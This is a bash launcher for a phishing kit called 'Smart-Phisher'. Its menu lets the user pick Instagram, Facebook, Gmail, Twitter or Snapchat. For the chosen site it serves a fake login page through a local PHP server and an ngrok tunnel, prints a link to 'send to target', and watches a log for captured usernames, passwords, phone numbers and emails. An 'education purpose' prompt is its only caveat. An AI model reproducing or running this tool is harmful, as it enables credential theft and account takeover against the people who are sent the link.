#!/bin/bash
clear
echo ""
echo ""
echo ""
 echo -e $'\e[1;33m\e[0m' 
printf "\e[1;31m𝕃𝕆𝔸𝔻𝕀ℕ𝔾...\e[1;32m  𝐒𝐌𝐀𝐑𝐓-𝐏𝐇𝐈𝐒𝐇𝐄𝐑 𝑭𝑹𝑨𝑴𝑬𝑾𝑶𝑹𝑲 𝑺𝑻𝑨𝑹𝑻𝑰𝑵𝑮 ... \e[0m"
echo""
 echo -e $'\e[1;33m\e[0m' 
sleep 6
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m 𝐔𝐒𝐄 𝐎𝐍𝐋𝐘 𝐅𝐎𝐑 𝐄𝐃𝐔𝐂𝐀𝐓𝐈𝐎𝐍 𝐏𝐔𝐑𝐏𝐎𝐒𝐄                  \e[1;33m     (𝙔/𝙉) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh


echo ""
echo -e $'\e[1;31m         𝐂𝐫𝐞𝐚𝐭𝐞 𝐒𝐜𝐚𝐦 𝐏𝐚𝐠𝐞\e[0m'
echo""
echo -e $'\e[1;33m            [01]= \e[1;32m 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦  \e[0m'
echo""
echo""
echo -e $'\e[1;33m            [02]= \e[1;32m 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤\e[0m'
echo""
echo""
echo -e $'\e[1;33m            [03]= \e[1;32m 𝐆𝐦𝐚𝐢𝐥  \e[0m'
echo""
echo""
echo -e $'\e[1;33m            [04]= \e[1;32m 𝐓𝐰𝐢𝐭𝐭𝐞𝐫 \e[0m'
echo""
echo""
echo -e $'\e[1;33m            [05]= \e[1;32m 𝐒𝐧𝐚𝐩𝐜𝐡𝐚𝐭 \e[0m'
echo ""
echo""
echo""
echo""
echo""
                 read -p $'\e[1;35m[\e[1;35m-\e[1;35m]\e[1;31m 𝐒\e[1;34m𝐄𝐓 \e[1;31m 𝐘\e[1;34m𝐎𝐔𝐑 \e[1;31m 𝐓\e[1;34m𝐀𝐑𝐆𝐄𝐓 \e[0m\e[1;31m      ------------>> : \e[0m\e[1;31m' option
		 case $option in
                        2) cd facebook/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[\e[0m\e[1;37m-\e[0m\e[1;34m]\e[0m\e[1;31m 𝐓𝐀𝐑𝐆𝐄𝐓 ----->>\e[1;32m           𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \e[0m'
                            echo -e $'\e[1;31m \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;32m [𝐂-𝐌] 𝐂𝐫𝐞𝐚𝐭𝐢𝐧𝐠 𝐚 𝐋𝐢𝐧𝐤...           \e[0m'
                            echo""
                            echo -e $'\e[1;34m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭...   \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34m𝐒𝐄𝐍𝐃 𝐓𝐇𝐈𝐒 𝐋𝐈𝐍𝐊 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 𝐓𝐎 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐂𝐎𝐔𝐍𝐓              \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;
                      1) cd instagram/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;32m𝐓𝐀𝐑𝐆𝐄𝐓 ------->>\e[1;31m         𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;32m [𝐂-𝐌] 𝐂𝐫𝐞𝐚𝐭𝐢𝐧𝐠 𝐚 𝐋𝐢𝐧𝐤...   \e[0m'
                            echo -e $'\e[1;31m  \e[0m'
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭...    \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34m𝐒𝐄𝐍𝐃 𝐓𝐇𝐈𝐒 𝐋𝐈𝐍𝐊 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 𝐓𝐎 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐂𝐎𝐔𝐍𝐓             \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;
                     4) cd twitter/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m𝐓𝐀𝐑𝐆𝐄𝐓 ------->>\e[1;32m             𝐓𝐖𝐈𝐓𝐓𝐄𝐑 \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m  [𝐂-𝐌] 𝐂𝐫𝐞𝐚𝐭𝐢𝐧𝐠 𝐚 𝐋𝐢𝐧𝐤...\e[0m'
                            echo -e $'\e[1;31m  \e[0m'
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭...   \e[0m' 
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34m𝐒𝐄𝐍𝐃 𝐓𝐇𝐈𝐒 𝐋𝐈𝐍𝐊 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 𝐓𝐎 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐂𝐎𝐔𝐍𝐓                \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;
                    5) cd snapchat/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m𝐓𝐀𝐑𝐆𝐄𝐓 ------->>\e[1;32m          𝐒𝐍𝐀𝐏𝐂𝐇𝐀𝐓 \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m [𝐂-𝐌] 𝐂𝐫𝐞𝐚𝐭𝐢𝐧𝐠 𝐚 𝐋𝐢𝐧𝐤... \e[0m'
                            echo -e $'\e[1;31m  \e[0m'
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭...  \e[0m' 
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34m 𝐒𝐄𝐍𝐃 𝐓𝐇𝐈𝐒 𝐋𝐈𝐍𝐊 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 𝐓𝐎 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐂𝐎𝐔𝐍𝐓                 \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;
                     3)   cd email/
                            echo "" 
                            echo""
                            echo""
                            echo""
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;31m𝐓𝐀𝐑𝐆𝐄𝐓 -------->>\e[1;34m           𝐄𝐌𝐀𝐈𝐋 \e[0m'
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo -e $'\e[1;31m\e[0m'
                            echo -e $'\e[1;31m\e[0m\e[1;37m\e[0m\e[1;34m\e[0m\e[1;32m [𝐂-𝐌] 𝐂𝐫𝐞𝐚𝐭𝐢𝐧𝐠 𝐚 𝐋𝐢𝐧𝐤... \e[0m'
                            echo -e $'\e[1;31m  \e[0m'
                            echo -e $'\e[1;31m[-]\e[0m\e[1;37m \e[0m\e[1;34m \e[0m\e[1;32m 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭...  \e[0  \e[0m'
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo -e $'\e[1;31m\e[0m'
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[1;34m𝐒𝐄𝐍𝐃 𝐓𝐇𝐈𝐒 𝐋𝐈𝐍𝐊 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 𝐓𝐎 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐂𝐎𝐔𝐍𝐓                  \e[1;33m\e[1;34m\e[0m\e[1;31m %s\e[0m\n" $link
                            echo ""
                            echo ""
                            tail -f log.txt | grep -e "username" -e "password" -e "number" -e "url" -e "fullname" -e "email"
                 ;;

               esac
                ;;

